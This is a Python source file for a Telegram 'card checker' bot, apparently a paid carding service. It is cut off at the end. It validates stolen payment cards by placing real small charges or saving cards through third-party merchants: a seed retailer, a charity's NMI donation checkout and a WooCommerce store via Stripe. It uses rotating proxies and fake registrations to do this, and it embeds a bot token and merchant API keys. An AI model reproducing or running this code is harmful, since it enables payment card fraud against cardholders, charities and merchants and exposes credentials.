# -*- coding: utf-8 -*-
import telebot, base64, re, time, os, sys, json, threading, hashlib, requests, random, datetime, queue, uuid
from concurrent.futures import ThreadPoolExecutor
from faker import Faker
from curl_cffi import requests as cffi_requests

if sys.platform == 'win32':
    os.system('chcp 65001 > nul')
try:
    sys.stdout.reconfigure(encoding='utf-8')
except:
    pass

faker = Faker()
BOT_TOKEN = '8986480779:AAEc54sEaDRm64pW7Ps4oPOySAiSpTgTOv8'
ADMIN_ID = 7352706784
bot = telebot.TeleBot(BOT_TOKEN)

os.makedirs('Data', exist_ok=True)
PREMIUM_FILE = 'Data/premium.txt'
USERS_FILE = 'Data/users.txt'
BANNED_FILE = 'Data/banned.txt'
STATS_FILE = 'stats.json'
APPROVED_FILE = 'Data/approved.txt'
THREEDS_FILE = 'Data/3ds.txt'
PROXY_FILE = "Data/proxies.txt"

NMI_CART_FILE = 'Data/nmi_cart.txt'

NMI_DEFAULT_CART = "415d3277-d9cc-4da0-8ec7-05f17d1fc81a"
NMI_DEFAULT_CHECKOUT = "eb03a7a5-8a96-45c9-807f-e69090849b6e"
NMI_AMOUNT = "1"
NMI_CURRENCY = "GBP"
NMI_MERCHANT_ID = "7bb5a59a-0713-4afa-a212-c9c77d516032"
NMI_SUBSCRIPTION_ID = "6e"
NMI_TOKENIZATION_KEY = "jkT6Tw-9VAN3X-FATGG5-zZFbpW"
NMI_PUBLIC_KEY = "checkout_public_aPUUrpwDYU552KWuZug9gh8E849W3nXB"
NMI_USER_AG = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
NMI_TIMEOUT = 30

SE_BASE = "https://www.southernexposure.com"
SE_PK = "pk_live_TBFfasfS7K7wBmYGrsbetA4W"
SE_VARIANT_ID = 1633
SE_PRODUCT_ID = 5809864

CHECK_LIMITS_FILE = 'Data/daily_limits.json'
LIMITS_LOCK = threading.Lock()

ADMIN_LIMIT = 5000
PREMIUM_LIMIT = 1000
FREE_LIMIT = 0
MAX_RETRIES = 3
WORKERS = 1
CARD_DELAY = 5 

FREE_DAILY_LIMIT = 10
PREMIUM_DAILY_LIMIT = 100
ADMIN_DAILY_LIMIT = 0

ACTIVE_JOBS = {}
ACTIVE_USERS_ST = {}
ACTIVE_USERS_NMI = {}
ACTIVE_USERS_SE = {}
STATS_LOCK = threading.Lock()

LIVE_HITS = {}

DIAMOND = "\u25c6"
STAR = "\u2726"
HDIAMOND = "\u25c8"
ARROW = "\u2794"
HLINE = "\u2501"
CLOCK = "\u23f1"
FIRE = "\U0001f525"
CHECK = "\u2705"
CROSS = "\u274c"
LOCK = "\U0001f510"
WARN = "\u26a0\ufe0f"

START_ANIMATION_URL = "https://files.catbox.moe/qu08ie.gif"

def bold(text):
    text = str(text).lower()
    result = []
    for ch in text:
        o = ord(ch)
        if 65 <= o <= 90:
            result.append(chr(o - 65 + 0x1D400))
        elif 97 <= o <= 122:
            result.append(chr(o - 97 + 0x1D41A))
        elif 48 <= o <= 57:
            result.append(chr(o - 48 + 0x1D7CE))
        else:
            result.append(ch)
    return "".join(result)

def bold_capitalize(text):
    """يحول أول حرف من كل كلمة إلى Bold Capital والباقي Bold Small"""
    text = str(text)
    result = []
    prev_is_letter = False
    for ch in text:
        o = ord(ch)
        if 65 <= o <= 90:
            if prev_is_letter:
                result.append(chr(o - 65 + 0x1D41A))
            else:
                result.append(chr(o - 65 + 0x1D400))
            prev_is_letter = True
        elif 97 <= o <= 122:
            if prev_is_letter:
                result.append(chr(o - 97 + 0x1D41A))
            else:
                result.append(chr(o - 97 + 0x1D400))
            prev_is_letter = True
        elif 48 <= o <= 57:
            result.append(chr(o - 48 + 0x1D7CE))
            prev_is_letter = True
        else:
            result.append(ch)
            prev_is_letter = False
    return "".join(result)

for f in [USERS_FILE, PREMIUM_FILE, BANNED_FILE, APPROVED_FILE, THREEDS_FILE, NMI_CART_FILE]:
    if not os.path.exists(f):
        open(f, 'w').close()

if not os.path.exists(STATS_FILE):
    with open(STATS_FILE, 'w') as f:
        json.dump({"approved": 0, "3ds": 0, "premium_users": 0, "banned_users": 0, "total_users": 0, "nmi_charged": 0, "nmi_declined": 0}, f)
if not os.path.exists(CHECK_LIMITS_FILE):
    with open(CHECK_LIMITS_FILE, 'w') as f:
        json.dump({}, f)

def load_limits():
    with LIMITS_LOCK:
        try:
            with open(CHECK_LIMITS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}

def save_limits(data):
    with LIMITS_LOCK:
        try:
            with open(CHECK_LIMITS_FILE, 'w') as f:
                json.dump(data, f)
        except:
            pass

def get_user_limit(user_id):
    uid = str(user_id)
    data = load_limits()
    now = time.time()
    entry = data.get(uid, {})
    used = entry.get("used", 0)
    reset_at = entry.get("reset_at", 0)
    if now >= reset_at:
        used = 0
        reset_at = now + 86400
    if is_admin(user_id):
        daily = ADMIN_DAILY_LIMIT
    elif is_premium(user_id):
        daily = PREMIUM_DAILY_LIMIT
    else:
        daily = FREE_DAILY_LIMIT
    return used, daily, max(0, int(reset_at - now)), reset_at

def consume_check(user_id):
    uid = str(user_id)
    data = load_limits()
    now = time.time()
    entry = data.get(uid, {})
    used = entry.get("used", 0)
    reset_at = entry.get("reset_at", 0)
    if now >= reset_at:
        used = 0
        reset_at = now + 86400
    if is_admin(user_id):
        daily = ADMIN_DAILY_LIMIT
    elif is_premium(user_id):
        daily = PREMIUM_DAILY_LIMIT
    else:
        daily = FREE_DAILY_LIMIT
    if daily == 0:
        data[uid] = {"used": used, "reset_at": reset_at}
        save_limits(data)
        return True, used, 0, 0
    if used >= daily:
        return False, used, daily, max(0, int(reset_at - now))
    used += 1
    data[uid] = {"used": used, "reset_at": reset_at}
    save_limits(data)
    return True, used, daily, max(0, int(reset_at - now))

def format_reset_time(secs):
    h = secs // 3600
    m = (secs % 3600) // 60
    return f"{h}h {m}m"

def check_limit_message(used, limit, reset_secs):
    return (
        f"{WARN} {bold_capitalize('Daily limit reached')}\n"
        f"{'='*20}\n"
        f"{bold_capitalize('used')}: {used}/{limit}\n"
        f"{bold_capitalize('reset in')}: {format_reset_time(reset_secs)}\n"
        f"{'='*20}\n"
        f"{bold_capitalize('Upgrade to Premium for more checks')}"
    )

def get_stats():
    with STATS_LOCK:
        try:
            with open(STATS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {"approved": 0, "3ds": 0, "premium_users": 0, "banned_users": 0, "total_users": 0, "nmi_charged": 0, "nmi_declined": 0}

def save_stats(stats):
    with STATS_LOCK:
        try:
            with open(STATS_FILE, 'w') as f:
                json.dump(stats, f)
        except:
            pass

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_premium(user_id):
    try:
        with open(PREMIUM_FILE, 'r') as f:
            premiums = f.read().splitlines()
        for p in premiums:
            if str(user_id) in p:
                parts = p.split('|')
                if len(parts) > 1:
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp:
                        return True
                else:
                    return True
    except:
        pass
    return False

def is_banned(user_id):
    try:
        with open(BANNED_FILE, 'r') as f:
            bans = f.read().splitlines()
        for b in bans:
            if str(user_id) in b:
                parts = b.split('|')
                if len(parts) > 1:
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp:
                        return True
                else:
                    return True
    except:
        pass
    return False

def add_user(user_id):
    try:
        with open(USERS_FILE, 'r+') as f:
            users = f.read().splitlines()
            if str(user_id) not in users:
                f.write(str(user_id) + '\n')
                s = get_stats()
                s["total_users"] = len(users) + 1
                save_stats(s)
    except:
        pass

def get_bin_info(bin_code):
    try:
        res = requests.get("https://bins.antipublic.cc/bins/" + bin_code, timeout=10)
        if res.status_code == 200:
            data = res.json()
            return (data.get('brand', 'UNKNOWN'), data.get('bank', 'UNKNOWN'),
                    data.get('country_name', 'UNKNOWN'), data.get('level', 'N/A'),
                    data.get('type', 'N/A'), data.get('country_flag', ''))
    except:
        pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "N/A", "N/A", ""

def build_template(gate_name, gate_tag, status_code, response, brand, bank, country, level, type_cc, flag, elapsed, cc_full=None, is_mass=False):
    if status_code == "CHARGED":
        status_txt = "🔥 " + bold("charged")
    elif status_code == "APPROVED":
        status_txt = "✅ " + bold("approved")
    elif status_code == "3DS":
        status_txt = "🔐 " + bold("3ds")
    elif status_code == "DECLINED":
        status_txt = "❌ " + bold("declined")
    else:
        status_txt = "⚠️ " + bold("error")

    safe_resp = str(response).replace("<", "").replace(">", "").replace("&", "")
    
    if gate_name == "NMI Charge":
        title_display = bold_capitalize("nmi charge")
        gate_display_bold = bold_capitalize("nmi charge")
        amt = " $1.12"
    elif gate_name == "Stripe Auth":
        title_display = bold_capitalize("stripe auth")
        gate_display_bold = bold_capitalize("stripe auth")
        amt = ""
    elif gate_name == "Stripe Charge 2$":
        title_display = bold_capitalize("stripe charge")
        gate_display_bold = bold_capitalize("stripe charge")
        amt = " $2.00"
    else:
        title_display = bold_capitalize(gate_name)
        gate_display_bold = bold_capitalize(gate_name)
        amt = ""

    if is_mass:
        line_card = "◆ " + bold_capitalize("card") + " : <code>" + str(cc_full) + "</code>"
        line_status = "◆ " + bold_capitalize("status") + " : " + status_txt
        line_resp = "◆ " + bold_capitalize("response") + " : " + bold(safe_resp)
        return f"{line_card}\n{line_status}\n{line_resp}"
    
    line_top = DIAMOND + (HLINE * 22) + DIAMOND
    line_title = "   ✧ ✦ " + title_display + " ✦ ✧" 
    line_top2 = DIAMOND + (HLINE * 22)
    
    line_card = "   " + HDIAMOND + " ▭ " + bold_capitalize("card") + " : <code>" + str(cc_full) + "</code>"
    line_gate = "   " + HDIAMOND + " ⌁ " + bold_capitalize("gate") + " : " + gate_display_bold + amt
    line_status = "   " + HDIAMOND + " ⌾ " + bold_capitalize("status") + " : " + status_txt
    line_resp = "   " + HDIAMOND + " ↳ " + bold_capitalize("response") + " : " + bold(safe_resp)
    
    line_mid = HLINE * 23
    
    line_bin = "   " + HDIAMOND + " ⊞ " + bold_capitalize("bin") + " : " + bold(str(brand)) + " - " + bold(str(type_cc)) + " - " + bold(str(level))
    line_bank = "   " + HDIAMOND + " ⌂ " + bold_capitalize("bank") + " : " + bold(str(bank))
    
    country_flag_emoji = flag if flag else "🌍"
    line_country = "   " + HDIAMOND + " ⌖ " + bold_capitalize("country") + " : " + bold(str(country)) + " " + country_flag_emoji
    
    line_time = "   " + HDIAMOND + " ◷ " + bold_capitalize("time") + " : " + str(elapsed) + "s  |  <a href='https://t.me/FUYRM1'>fᑌᖇY</a>"
    line_bot = DIAMOND + (HLINE * 22) + DIAMOND

    parts = [line_top, line_title, line_top2, line_card, line_gate, line_status, line_resp, line_mid, line_bin, line_bank, line_country, line_mid, line_time, line_bot]
    return "\n".join(parts)

def build_mass_caption(gate_title, res, total, start_time):
    elapsed = int(time.time() - start_time)
    mins, secs = divmod(elapsed, 60)
    line_sep = "◈" + ("━" * 22) + "◈"

    title_bold = bold_capitalize(gate_title)

    lines = (
        f"{line_sep}\n"
        f"   ✧ ✦ ⏱ {title_bold} ✦ ✧\n"
        f"{line_sep}\n"
        f"   ◆ {bold_capitalize('progress')} : {res['checked']}/{total}\n"
    )

    if "Stripe Auth" in gate_title:
        lines += f"   ◆ {bold_capitalize('approved')} : {res.get('live', 0)}\n"
    else:
        lines += f"   ◆ {bold_capitalize('charged')} : {res.get('charged', 0)}\n"
        lines += f"   ◆ {bold_capitalize('approved')} : {res.get('live', 0)}\n"

    lines += (
        f"   ◆ {bold_capitalize('declined')} : {res['declined']}\n"
        f"   ◆ {bold_capitalize('errors')} : {res['error']}\n"
        f"   ◆ {bold_capitalize('total')} : {total}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   ◆ {bold_capitalize('dev')} : fᑌᖇY\n"
        f"{line_sep}"
    )
    return lines

def build_dashboard_keyboard(res, total, job_id=""):
    mk = telebot.types.InlineKeyboardMarkup(row_width=2)

    btn_charge = telebot.types.InlineKeyboardButton(
        f"🔥 {bold_capitalize('charge')} {res.get('charged', 0)}",
        callback_data=f"get_charged_{job_id}",
        style="primary"
    )
    btn_approved = telebot.types.InlineKeyboardButton(
        f"✅ {bold_capitalize('approved')} {res.get('live', 0)}",
        callback_data=f"get_approved_{job_id}",
        style="primary"
    )
    btn_status = telebot.types.InlineKeyboardButton(
        f"⏳ {bold_capitalize('status')} {res.get('checked', 0)}",
        callback_data="none",
        style="danger"
    )
    btn_total = telebot.types.InlineKeyboardButton(
        f"📦 {bold_capitalize('total')} {total}",
        callback_data="none",
        style="success"
    )

    mk.row(btn_charge, btn_approved)
    mk.row(btn_status, btn_total)
    
    # --- زر الإيقاف الجديد باللون الأحمر ---
    if job_id:
        btn_stop = telebot.types.InlineKeyboardButton(
            f"🔴 {bold_capitalize('stop')}",  
            callback_data=f"stop_{job_id}",
            style="danger" 
        )
        mk.row(btn_stop) 
    # ----------------------------------------

    return mk

def load_nmi_cart():
    try:
        with open(NMI_CART_FILE, 'r') as f:
            lines = f.read().strip().splitlines()
            if len(lines) >= 2:
                return lines[0].strip(), lines[1].strip()
    except:
        pass
    return NMI_DEFAULT_CART, NMI_DEFAULT_CHECKOUT

def save_nmi_cart(cart_id, checkout_id):
    with open(NMI_CART_FILE, 'w') as f:
        f.write(cart_id.strip() + '\n' + checkout_id.strip() + '\n')

proxy_list = []
PROXY_QUEUE = queue.Queue()

def load_proxies():
    global proxy_list
    proxy_list = []
    with PROXY_QUEUE.mutex:
        PROXY_QUEUE.queue.clear()
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
            proxy_list = lines
            for p in lines:
                PROXY_QUEUE.put(p)
    return len(proxy_list)

load_proxies()

def format_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None
    if '@' in proxy_str:
        return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 4:
        return f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return proxy_str

def get_proxy_dict():
    global proxy_list
    if PROXY_QUEUE.empty():
        load_proxies()
    if PROXY_QUEUE.empty():
        return None, None
    p = PROXY_QUEUE.get()
    fp = format_proxy(p)
    if not any(p.startswith(proto) for proto in ['http', 'socks']):
        proxy_dict = {"http": f"http://{fp}", "https": f"http://{fp}"}
    else:
        proxy_dict = {"http": fp, "https": fp}
    return proxy_dict, p

def release_proxy(p):
    if p:
        PROXY_QUEUE.put(p)

def save_proxies(proxies):
    unique = list(dict.fromkeys(proxies))
    with open(PROXY_FILE, 'w') as f:
        for p in unique:
            f.write(p + '\n')
    load_proxies()

def test_proxy(proxy_str):
    try:
        fp = format_proxy(proxy_str.strip())
        if not fp:
            return False
        if not any(proxy_str.strip().startswith(proto) for proto in ['http', 'socks']):
            proxy_dict = {"http": f"http://{fp}", "https": f"http://{fp}"}
        else:
            proxy_dict = {"http": fp, "https": fp}
        r = requests.get('http://ip-api.com/json', proxies=proxy_dict, timeout=20)
        return r.status_code == 200
    except:
        return False

def test_proxies_bulk(proxy_list, max_workers=50):
    res = {"working": [], "dead": [], "invalid": []}
    lock = threading.Lock()
    def test_one(p):
        if ':' not in p:
            with lock: res["invalid"].append(p)
            return
        if test_proxy(p):
            with lock: res["working"].append(p)
        else:
            with lock: res["dead"].append(p)
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        ex.map(test_one, proxy_list)
    return res

def check_cc_southernexposure(cc_full, proxy_dict=None):
    try:
        parts = cc_full.strip().split('|')
        if len(parts) < 4: return "ERROR", "Invalid format", "UNKNOWN"
        cc, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3].replace('.', '')
    except: return "ERROR", "Invalid format", "UNKNOWN"

    if proxy_dict is None:
        proxy_dict, _ = get_proxy_dict()
    if not proxy_dict: return "ERROR", "No proxy set", "UNKNOWN"

    s = cffi_requests.Session(impersonate="chrome")
    s.proxies = proxy_dict
    s.headers.update({
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": SE_BASE,
        "referer": SE_BASE + "/categories/request-a-catalog/"
    })

    temp_token = str(uuid.uuid4())
    real_session_token = temp_token

    try:
        s.get(SE_BASE, timeout=30, verify=False)
        cart_payload = {"variant": SE_VARIANT_ID, "quantity": 1, "sessionToken": temp_token}
        r_cart = s.post(SE_BASE + "/api/carts/anonymous/add/", json=cart_payload, timeout=30, verify=False)
        
        if r_cart.status_code not in (200, 201):
            return "ERROR", f"Cart Error {r_cart.status_code}", "UNKNOWN"
            
        new_token = r_cart.text.strip()
        if len(new_token) > 30 and "-" in new_token:
            real_session_token = new_token
    except Exception:
        return "ERROR", "Cart Timeout/Proxy Fail", "UNKNOWN"

    try:
        s.post(SE_BASE + "/api/carts/anonymous/details/", json={"sessionToken": real_session_token}, timeout=30, verify=False)
    except: pass

    try:
        d = {"card[number]": cc, "card[cvc]": cvv, "card[exp_year]": yy, "card[exp_month]": mm, "key": SE_PK, "guid": str(uuid.uuid4()), "muid": str(uuid.uuid4()), "sid": str(uuid.uuid4())}
        r1 = s.post("https://api.stripe.com/v1/tokens", headers={"content-type": "application/x-www-form-urlencoded"}, data=d, timeout=30, verify=False)
        j1 = r1.json()
        if "error" in j1:
            msg = str(j1["error"].get("message", "Declined")).lower()
            if "security code" in msg or "cvc" in msg: return "DECLINED", "Invalid CVC", "UNKNOWN"
            if "number is incorrect" in msg: return "DECLINED", "Invalid Card", "UNKNOWN"
            if "expired" in msg: return "DECLINED", "Card Expired", "UNKNOWN"
            return "DECLINED", str(j1["error"].get("message", "Declined"))[:80], "UNKNOWN"
        tok_id = j1.get("id")
        brand = str(j1.get("card", {}).get("brand", "UNKNOWN")).upper()
    except: return "ERROR", "Stripe Error", "UNKNOWN"

    shipping = {"skipVerification": False, "isDefault": True, "state": {"state": "OR"}, "id": None, "firstName": "Ali", "lastName": "Hassan", "companyName": "Main St 123", "addressOne": "Main St 123", "addressTwo": "Main St 123", "city": "Portland", "zipCode": "97201", "country": "US", "phoneNumber": "18028800811"}
    billing = dict(shipping)
    email = f"test{random.randint(1000,9999)}@gmail.com"
    inventory = {"warnings": {str(SE_PRODUCT_ID): []}, "errors": {str(SE_PRODUCT_ID): []}}

    try:
        s.post(SE_BASE + "/api/checkout/validate-anonymous-customer-details/", 
               json={"cartInventoryNotifications": inventory, "sessionToken": real_session_token, "shippingAddress": shipping, "skipAddressVerification": False, "email": email}, 
               timeout=30, verify=False)

        payload = {
            "shippingAddress": shipping, "billingAddress": billing, "priorityShipping": False, 
            "couponCode": None, "comment": "", "sessionToken": real_session_token, "email": email,
            "cartInventoryNotifications": inventory, "skipAddressVerification": True, "stripeToken": tok_id
        }
        
        r2 = s.post(SE_BASE + "/api/checkout/anonymous-place-order/", json=payload, timeout=30, verify=False)
        txt = r2.text.lower()
        
        real_response = r2.text.strip()
        try:
            j2 = r2.json()
            if isinstance(j2, dict):
                if "" in j2 and isinstance(j2[""], list) and len(j2[""]) > 0:
                    real_response = str(j2[""][0])  
                elif "message" in j2:
                    real_response = str(j2["message"])
                elif "result" in j2 and "orderId" in j2["result"]:
                    real_response = f"Success! Order ID: {j2['result']['orderId']}"
        except: pass

        if r2.status_code in (200, 201): 
            return "CHARGED", bold("Charged Successfully"), brand
        if "requires_action" in txt or "3d" in txt: 
            return "3DS", bold("3D Auth Required"), brand
        
        if "insufficient funds" in txt:
            return "APPROVED", bold("Insufficient Funds"), brand
        elif "declined" in txt:
            return "DECLINED", bold("Card Declined"), brand
        else:
            return "DECLINED", bold("Card Declined"), brand
    except Exception: 
        return "ERROR", "Place Order Failed", brand

def check_cc_nmi(cc_full, proxy_dict=None):
    try:
        parts = cc_full.strip().split('|')
        if len(parts) < 4:
            return "ERROR", "Invalid format", "UNKNOWN"
        CC, MM, YY, CVV = parts[0], parts[1], parts[2], parts[3].replace('.', '')
        if len(YY) == 4: YY = YY[2:]
        if len(MM) == 1: MM = "0" + MM
    except:
        return "ERROR", "Invalid format", "UNKNOWN"

    if proxy_dict is None:
        proxy_dict, _ = get_proxy_dict()
    if not proxy_dict:
        return "ERROR", "No proxy set. Use /proxy add", "UNKNOWN"

    cart_id, checkout_id = load_nmi_cart()
    brand_detected = "UNKNOWN"

    try:
        r = requests.post("https://secure.safewebservices.com/token/api/create",
            data={"tokenizationKey": NMI_TOKENIZATION_KEY, "cartCorrelationId": "", "source": "16"},
            headers={"origin": "https://muslimhands.org.uk", "referer": "https://muslimhands.org.uk/", "user-agent": NMI_USER_AG},
            proxies=proxy_dict, timeout=NMI_TIMEOUT, verify=False)
        if r.status_code != 200:
            return "ERROR", f"create HTTP {r.status_code}", "UNKNOWN"
        d = r.json()
        token_id = d.get("tokenId") or d.get("token") or d.get("id")
        if not token_id:
            return "ERROR", "no token", "UNKNOWN"

        for el, val in [("ccnumber", CC), ("ccexp", MM+YY), ("cvv", CVV)]:
            requests.post("https://secure.safewebservices.com/token/api/save_multipart_token",
                json={"tokenizationKey": NMI_TOKENIZATION_KEY, "cartCorrelationId": "", "tokenId": token_id,
                      "data": [{"elementId": el, "value": val}]},
                headers={"content-type": "application/json;charset=UTF-8",
                         "origin": "https://secure.safewebservices.com", "user-agent": NMI_USER_AG},
                proxies=proxy_dict, timeout=NMI_TIMEOUT, verify=False)

        try:
            r = requests.post("https://secure.safewebservices.com/token/api/lookup",
                json={"tokenId": token_id, "tokenizationKey": NMI_TOKENIZATION_KEY, "cartCorrelationId": ""},
                headers={"origin": "https://muslimhands.org.uk", "user-agent": NMI_USER_AG},
                proxies=proxy_dict, timeout=NMI_TIMEOUT, verify=False)
            if r.status_code == 200:
                lk = r.json()
                brand_detected = str(lk.get("card", {}).get("type", "UNKNOWN"))
        except:
            pass

        idem = f"{cart_id}/{uuid.uuid4().hex[:8]}/{time.strftime('%Y-%m-%d')}"
        r = requests.post(
            f"https://api.n3o.cloud/eu1/api/checkout/networkmerchants/v1.0/payments/{NMI_MERCHANT_ID}/{cart_id}/{checkout_id}/process",
            json={"idempotencyKey": idem,
                  "value": {"currency": NMI_CURRENCY, "amount": 1},
                  "card": {"cardBrand": "visa", "channel": "ecommerce", "token": token_id}},
            headers={"content-type": "application/json", "n3o-subscription-id": NMI_SUBSCRIPTION_ID,
                     "origin": "https://muslimhands.org.uk", "referer": "https://muslimhands.org.uk/", "user-agent": NMI_USER_AG},
            proxies=proxy_dict, timeout=NMI_TIMEOUT, verify=False)

        if r.status_code != 200:
            return "ERROR", f"process HTTP {r.status_code}", brand_detected
        try:
            j = r.json()
        except:
            return "ERROR", f"bad json: {r.text[:80]}", brand_detected

        if j.get("error") == True:
            return "ERROR", "Gateway Error", brand_detected
        elif j.get("result") == True:
            return "CHARGED", bold("Charged Successfully"), brand_detected
        elif j.get("result") == False:
            return "DECLINED", bold("Card Declined"), brand_detected
        else:
            return "ERROR", "Unknown Error", brand_detected
    except requests.exceptions.ProxyError:
        return "ERROR", "proxy error", brand_detected
    except requests.exceptions.Timeout:
        return "ERROR", "timeout", brand_detected
    except Exception as e:
        return "ERROR", str(e)[:100], brand_detected

GATEWAYS = [
    {
        "name": "Dila Boards",
        "url": "https://dilaboards.com/en/moj-racun/add-payment-method/",
        "ajax_url": "https://dilaboards.com/en/",
    }
]

def check_cc(cc_full, proxy=None):
    session = requests.Session()
    if proxy:
        session.proxies = proxy
    try:
        data_parts = cc_full.strip().split('|')
        cc, mm, yy, cvv = data_parts[0], data_parts[1], data_parts[2], data_parts[3].replace('.', '')
    except:
        return "ERROR", "Invalid format", "UNKNOWN"
    user_ag = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'

    for gw in GATEWAYS:
        try:
            current_cookies = gw.get("cookies", {})
            current_nonce = gw.get("nonce", "")
            current_pk = gw.get("stripe_key", "")
            ajax_url = gw["ajax_url"]

            if "dilaboards.com" in gw.get("url", ""):
                try:
                    url_1 = gw["url"]
                    h_pre = {'User-Agent': user_ag, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5', 'Alt-Used': 'dilaboards.com', 'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Priority': 'u=0, i'}
                    r_pre = session.get(url_1, headers=h_pre, timeout=15)
                    reg_nonce = re.findall('name="woocommerce-register-nonce" value="(.*?)"', r_pre.text)[0]
                    current_pk = re.findall('"key":"(.*?)"', r_pre.text)[0]
                    h_reg = {'User-Agent': user_ag, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5', 'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://dilaboards.com', 'Alt-Used': 'dilaboards.com', 'Connection': 'keep-alive',
                        'Referer': url_1, 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Priority': 'u=0, i'}
                    reg_data = {'email': faker.email(domain="gmail.com"), 'wc_order_attribution_source_type': 'typein',
                        'wc_order_attribution_referrer': '(none)', 'wc_order_attribution_utm_campaign': '(none)',
                        'wc_order_attribution_utm_source': '(direct)', 'wc_order_attribution_utm_medium': '(none)',
                        'wc_order_attribution_utm_content': '(none)', 'wc_order_attribution_utm_id': '(none)',
                        'wc_order_attribution_utm_term': '(none)', 'wc_order_attribution_utm_source_platform': '(none)',
                        'wc_order_attribution_utm_creative_format': '(none)', 'wc_order_attribution_utm_marketing_tactic': '(none)',
                        'wc_order_attribution_session_entry': url_1,
                        'wc_order_attribution_session_start_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        'wc_order_attribution_session_pages': '2', 'wc_order_attribution_session_count': '1',
                        'wc_order_attribution_user_agent': user_ag, 'woocommerce-register-nonce': reg_nonce,
                        '_wp_http_referer': '/en/moj-racun/add-payment-method/', 'register': 'Register'}
                    r_reg = session.post(url_1, headers=h_reg, data=reg_data, timeout=15)
                    if "so soon" in r_reg.text.lower() or "too many" in r_reg.text.lower():
                        return "ERROR", "Rate Limit", "UNKNOWN"
                    current_nonce = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', r_reg.text)[0]
                except:
                    return "ERROR", "Registration Failed", "UNKNOWN"
            else:
                for k, v in current_cookies.items():
                    session.cookies.set(k, v)

            guid = str(uuid.uuid4()); muid = str(uuid.uuid4()); sid = str(uuid.uuid4())
            ele_id = f"src_{random.getrandbits(128):032x}"
            h1 = {'User-Agent': user_ag, 'Accept': 'application/json', 'Referer': 'https://js.stripe.com/',
                'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://js.stripe.com'}
            d1 = {'type': 'card', 'card[number]': cc, 'card[cvc]': cvv, 'card[exp_year]': yy, 'card[exp_month]': mm,
                'allow_redisplay': 'unspecified', 'billing_details[address][postal_code]': str(random.randint(10000, 99999)),
                'billing_details[address][country]': 'US',
                'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
                'referrer': gw.get("url", ajax_url), 'time_on_page': str(random.randint(10000, 99999)),
                'client_attribution_metadata[client_session_id]': ele_id,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': ele_id,
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': guid, 'muid': muid, 'sid': sid, 'key': current_pk, '_stripe_version': '2024-06-20'}
            r1 = session.post('https://api.stripe.com/v1/payment_methods', headers=h1, data=d1, timeout=15)
            res1 = r1.json()
            if "error" in res1:
                msg = res1["error"].get("message", "Declined")
                if "security code is" in msg.lower():
                    return "DECLINED", msg, res1.get("card", {}).get("brand", "UNKNOWN")
                continue
            pm_id = res1["id"]
            brand = res1.get("card", {}).get("brand", "UNKNOWN")
            h2 = {'User-Agent': user_ag, 'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest', 'Referer': gw.get("url", ajax_url)}
            d2 = {'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card', '_ajax_nonce': current_nonce}
            final_ajax_url = f"{ajax_url}?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
            r2 = session.post(final_ajax_url, headers=h2, data=d2, timeout=20)
            if r2.status_code == 429:
                continue
            res2 = r2.json()
            success = res2.get('success', False)
            status_val = res2.get('data', {}).get('status', 'unknown')
            if success or status_val == 'succeeded':
                return "APPROVED", "Payment method added successfully.", brand
            msg = str(res2.get('data', {}).get('message', 'Declined'))
            if "so soon" in msg.lower() or "too many" in msg.lower():
                return "ERROR", "Rate Limit", brand
            if "security code is" in msg.lower():
                return "DECLINED", msg, brand
            if "requires_action" in msg.lower() or "require_action" in msg.lower():
                return "3DS", "Authentication Required", brand
            if "card was declined" in msg.lower() or "card number is incorrect" in msg.lower() or "security code is invalid" in msg.lower():
                return "DECLINED", msg, brand
            return "DECLINED", msg, brand
        except Exception:
            continue
    return "ERROR", "Gateway Rate Limited", "UNKNOWN"

SUB_PLANS = {
